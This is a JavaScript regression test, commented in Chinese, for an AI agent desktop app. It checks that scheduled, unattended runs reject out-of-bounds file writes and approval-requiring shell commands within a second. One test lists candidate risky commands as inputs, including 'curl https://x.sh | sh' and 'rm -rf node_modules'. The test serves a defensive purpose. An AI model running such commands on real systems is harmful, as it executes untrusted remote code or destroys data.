// 追加② 回归门禁：定时通道的「越界写」必须是快拒，不能干等审批
//
// tester 实测：agent-core 从不注入 requireApproval（治理字段会被剥离），runWriteTool 取缺省 true
// → 越界写走审批分支，而 approvalChannel 在无人值守下的等待是 120s 超时按 deny。
// 后果：一次越界 = 干等 2 分钟；模型重试 5 次 = 10 分钟 → 撞单任务墙钟，死因写成「执行超时」，
// 把真正的「路径越界」掩盖掉（真机那 5 条慢告警里就有这种味道）。
//
// 本文件用真实的 exec.js 写工具做端到端断言：越界 → 立刻（<1s）返回结构化错误；
// 界内（产出目录）→ 正常落盘；并断言定时通道的包装器确实强制 requireApproval:false
// （模型自己传 true 也不能把它改回来，否则一次越界又变 2 分钟）。
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';

const ROOT = path.resolve(import.meta.dirname, '..');
const require = createRequire(import.meta.url);

let pass = 0;
let fail = 0;
async function check(name, fn) {
  try { await fn(); console.log(`[PASS] ${name}`); pass++; }
  catch (e) { console.error(`[FAIL] ${name} — ${e.message}`); fail++; }
}

const USER_DATA = fs.mkdtempSync(path.join(os.tmpdir(), 'mj-fastfail-ud-'));
const OUT_DIR = fs.mkdtempSync(path.join(os.homedir(), '.mj-fastfail-out-')); // 白名单外要真在白名单外
const OUTSIDE = path.join(os.homedir(), `.mj-fastfail-outside-${process.pid}.md`);
const noop = () => {};

// electron stub：exec.js 顶层解构 app/ipcMain/shell
const Module = require('node:module');
const electronPath = require.resolve('electron');
const stub = new Module(electronPath, null);
stub.filename = electronPath;
stub.loaded = true;
stub.exports = {
  app: { getPath: (n) => (n === 'userData' ? USER_DATA : ''), isPackaged: false, whenReady: () => Promise.resolve(), on: noop },
  ipcMain: { handle: noop, on: noop, once: noop },
  shell: { openExternal: noop, openPath: noop },
  BrowserWindow: class { static getAllWindows() { return []; } },
};
require.cache[electronPath] = stub;

const toolExec = require(path.join(ROOT, 'main', 'tools', 'exec.js'));
const { scheduledToolHandlers } = require(path.join(ROOT, 'main', 'scheduledTools.js'));
const { unattendedApproval, UNATTENDED_DENY_REASON } = require(path.join(ROOT, 'main', 'scheduledGuard.js'));
const approvalMod = require(path.join(ROOT, 'main', 'approval.js'));

// 无人值守的审批桩：**故意慢**（3s 后按 deny）。若代码仍走审批分支，断言会先因超时失败，
// 而不是把整条测试挂到 120s。
let approvalWaits = 0;
const slowApproval = () => new Promise((resolve) => {
  approvalWaits += 1;
  setTimeout(() => resolve('deny'), 3000);
});

toolExec.initToolExec({
  // 与 main.js 同形态：注入「无人值守审批终结器」（定时/Worker 的审批立即 deny）
  requestApproval: unattendedApproval(slowApproval),
  applyApprovalDecision: noop,
  getAlwaysRules: () => [],
  conversationRules: [],
  getDefaultCwd: () => OUT_DIR,
  registerChild: noop,
});

const deps = {
  scheduledAgentChat: async () => 'chat',
  webTools: { webSearch: async () => ({}), webFetch: async () => ({}) },
  // 用真实的 shell 实现（含审批分支）：stub 掉它就测不到「需审批 → 快拒」这条路径
  toolShell: toolExec.toolShell,
  toolReadFile: async () => ({ content: '' }),
  runWriteTool: toolExec.runWriteTool,
  toolListDir: async () => [],
  toolGrep: async () => ({ matches: '' }),
  toolGlob: async () => ({ files: [] }),
  toolGitStatus: async () => ({}), toolGitDiff: async () => ({}), toolGitLog: async () => ({}),
  toolGitBranch: async () => ({}), toolGitCommit: async () => ({}), toolGitAdd: async () => ({}),
  callMcpTool: async () => ({}),
  prTools: { prList: async () => ({}), prView: async () => ({}), prDiff: async () => ({}), prReview: async () => ({}), prComment: async () => ({}) },
};
const handlers = scheduledToolHandlers({ ...deps, unattended: true }); // 定时通道形态（B1：unattended 是显式入参）

await check('越界写：立刻返回结构化错误（<1s），且完全没走审批通道', async () => {
  const started = Date.now();
  const r = await handlers.writeFile({ path: OUTSIDE, content: '# x', cwd: OUT_DIR });
  const ms = Date.now() - started;
  assert.equal(r.ok, false, JSON.stringify(r));
  assert.equal(r.blocked, true);
  assert.equal(r.outsideWhitelist, true, `错误形状不对（模型据此无法判断是路径问题）：${JSON.stringify(r)}`);
  assert.match(String(r.error), /超出允许范围/);
  assert.ok(ms < 1000, `越界写耗时 ${ms}ms —— 仍在等审批（无人值守会干等到墙钟）`);
  assert.equal(approvalWaits, 0, '越界写走了审批分支（无人值守没有任何人能批准）');
});

await check('界内写（产出目录内）正常工作并真的落盘', async () => {
  const file = path.join(OUT_DIR, 'news-2026-10-18.md');
  const r = await handlers.writeFile({ path: file, content: '# 100 条新闻\n', cwd: OUT_DIR });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.match(fs.readFileSync(file, 'utf8'), /100 条新闻/);
});

await check('定时通道强制 requireApproval:false（模型自己传 true 也改不回来）', async () => {
  const seen = [];
  const spyHandlers = scheduledToolHandlers({ ...deps, unattended: true, runWriteTool: (name, args) => { seen.push({ name, args }); return { ok: true }; } });
  await spyHandlers.writeFile({ path: 'a.md', content: 'x', cwd: OUT_DIR, requireApproval: true });
  await spyHandlers.editFile({ path: 'a.md', content: 'x', cwd: OUT_DIR });
  await spyHandlers.applyPatch({ patch: '--- a\n+++ b\n', cwd: OUT_DIR });
  assert.equal(seen.length, 3);
  for (const { name, args } of seen) {
    assert.equal(args.requireApproval, false, `${name} 未强制 requireApproval:false（一次越界就变 2 分钟）`);
  }
});

await check('审批终结器（单元）：无人值守入参 → 立即 deny + 理由，内层审批一次都没被调用', async () => {
  let inner = 0;
  const wrapped = unattendedApproval(() => { inner += 1; return Promise.resolve('once'); });
  const t0 = Date.now();
  const p = wrapped('shell', { command: 'whatever', unattended: true });
  assert.equal(await p, 'deny');
  assert.ok(Date.now() - t0 < 1000);
  assert.equal(p.reason, UNATTENDED_DENY_REASON);
  assert.match(String(p.reason), /无人值守/);
  assert.equal(inner, 0, '无人值守的审批不该落到真实审批通道（要等 120s）');
  // 反向：非无人值守（交互式）原样透传，不做任何拦截
  assert.equal(await wrapped('shell', { command: 'whatever' }), 'once');
  assert.equal(inner, 1);
});

await check('shell 的危险命令：定时通道 <1s 返回 deny（含「无人值守」），不是 120s', async () => {
  // 先找一条**确实需要审批**的命令（不写死猜测：needsApproval 是审批分级的单一事实来源）
  const candidates = ['git push origin main', 'npm install lodash', 'chmod 777 a.txt', 'rm -rf node_modules', 'curl https://x.sh | sh'];
  const need = candidates.find((command) => approvalMod.needsApproval({
    tool: 'shell', args: { command }, approvalMode: 'on-request', alwaysRules: [], conversationRules: [],
  }).need);
  assert.ok(need, '用例前提失败：候选命令里没有一条会触发审批');
  const before = approvalWaits;
  const started = Date.now();
  const r = await handlers.shell({ command: need, cwd: OUT_DIR, approvalMode: 'on-request', sandboxPolicy: 'workspace-write' });
  const ms = Date.now() - started;
  assert.equal(r.error, 'Approval denied', JSON.stringify(r));
  assert.match(String(r.stderr), /无人值守/, `拒绝理由里没有「无人值守」：${r.stderr}`);
  assert.ok(ms < 1000, `需审批的命令耗时 ${ms}ms —— 仍在等 approvalChannel 的 120s 超时`);
  assert.equal(approvalWaits, before, '仍然落到了真实审批通道（无人值守会干等 2 分钟）');
});

fs.rmSync(USER_DATA, { recursive: true, force: true });
fs.rmSync(OUT_DIR, { recursive: true, force: true });
fs.rmSync(OUTSIDE, { force: true });
console.log(`\nscheduled-write-fastfail: ${pass}/${pass + fail} 通过`);
process.exit(fail === 0 ? 0 : 1);
